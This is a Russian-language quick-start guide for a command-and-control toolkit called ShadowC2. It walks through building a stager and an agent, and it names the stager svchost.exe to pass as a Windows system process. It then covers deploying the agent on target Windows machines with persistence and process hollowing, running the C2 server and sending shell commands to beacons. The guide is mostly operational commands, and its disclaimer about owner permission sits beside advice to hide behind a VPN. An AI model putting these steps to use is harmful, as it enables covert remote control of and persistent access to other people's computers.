# ShadowC2 Toolkit - Быстрый старт

## Получение готового решения

Скачайте архив с полным toolkit:
```bash
wget https://your-server.com/c2_toolkit_complete.tar.gz
tar -xzf c2_toolkit_complete.tar.gz
cd c2_toolkit
```

## Быстрая установка

### 1. Установка зависимостей

```bash
# Debian/Ubuntu
sudo apt-get update
sudo apt-get install -y cmake gcc g++ python3 python3-pip openssl libssl-dev upx-ucl

# Установка Python зависимостей для сервера
cd server
pip3 install -r requirements.txt
cd ..
```

### 2. Сборка toolkit

```bash
# Полная сборка всех компонентов
python3 scripts/build.py

# Или сборка только стейджера (быстрее)
python3 scripts/build.py --stager-only
```

### 3. Настройка сервера

```bash
cd server
# Генерация SSL сертификатов
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
cd ..
```

### 4. Запуск C2 сервера

```bash
# Запуск на всех интерфейсах, порт 8443
python3 scripts/run_server.py --host 0.0.0.0 --port 8443

# Запуск в режиме отладки
python3 scripts/run_server.py --debug
```

### 5. Развертывание агента

Скопируйте файл на целевую Windows машину:
```bash
# Вариант 1: Стейджер (минимальный размер)
cp bin/svchost.exe /path/to/target/

# Вариант 2: Полный агент со всеми функциями
cp bin/shadowc2.exe /path/to/target/
```

На целевой машине:
```cmd
# Запуск стейджера (автоматическая загрузка пейлоада)
svchost.exe

# Запуск полного агента в режиме beacon
shadowc2.exe --beacon

# Запуск с установкой персистентности
shadowc2.exe --beacon --persist
```

### 6. Управление

Откройте браузер и перейдите по адресу вашего сервера:
```
https://your-server-ip:8443
```

В веб-интерфейсе вы можете:
- Просматривать активные beacon
- Отправлять команды
- Загружать/выгружать файлы
- Управлять персистентностью

## Краткие команды для управления

### Через веб-интерфейс
1. Выберите beacon из списка
2. Введите команду в поле ввода
3. Нажмите "Send Command"

### Через API
```bash
# Получить список beacon
curl -k https://localhost:8443/api/beacons

# Отправить команду
curl -k -X POST https://localhost:8443/api/commands?beacon_id=BEACON_ID \
  -H "Content-Type: application/json" \
  -d '{"type":"shell","data":{"command":"whoami"}}'
```

## Типовые сценарии использования

### Сценарий 1: Быстрый доступ
```bash
# На вашем сервере
python3 scripts/run_server.py --host 0.0.0.0 --port 8443

# На целевой машине (через ваш текущий доступ)
svchost.exe

# В веб-интерфейсе отправляйте команды
```

### Сценарий 2: Скрытное развертывание
```bash
# Агент с персистентностью и маскировкой
shadowc2.exe --beacon --persist --method hollowing
```

### Сценарий 3: Тестирование
```bash
# Запуск тестов
python3 scripts/test.py

# Проверка сборки
python3 scripts/build.py --clean
python3 scripts/build.py
```

## Файлы и директории

```
c2_toolkit/
├── src/                    # Исходный код C++
├── server/                 # C2 сервер Python
├── scripts/                # Скрипты сборки и управления
├── bin/                    # Скомпилированные файлы
├── docs/                   # Документация
├── build/                  # Директория сборки
├── CMakeLists.txt          # Конфигурация CMake
└── README.md              # Полная документация
```

## Быстрая настройка для вашего окружения

### Измените адрес C2 сервера

Отредактируйте файл `src/shadow.h`:
```cpp
#define C2_HOST L"your-domain.com"  // Ваш домен/IP
#define C2_PORT 443                  // Ваш порт
```

### Настройка интервала beacon

```cpp
#define BEACON_INTERVAL 30000  // 30 секунд (по умолчанию)
#define JITTER_PERCENT 25      // 25% jitter
```

## Проверка работоспособности

### 1. Тестирование компонентов
```bash
python3 scripts/test.py
```

### 2. Проверка сервера
```bash
curl -k https://localhost:8443/
```

### 3. Проверка сборки
```bash
python3 scripts/build.py --stager-only
ls -la bin/
```

## Поддержка

Если возникли проблемы:
1. Запустите тесты: `python3 scripts/test.py`
2. Проверьте логи сервера
3. Убедитесь, что все зависимости установлены
4. Проверьте файрвол и настройки сети

## Важные замечания

- Используйте только на системах с разрешением владельца
- Toolkit создается в образовательных целях
- Соблюдайте законы вашей страны
- Используйте VPN для дополнительной безопасности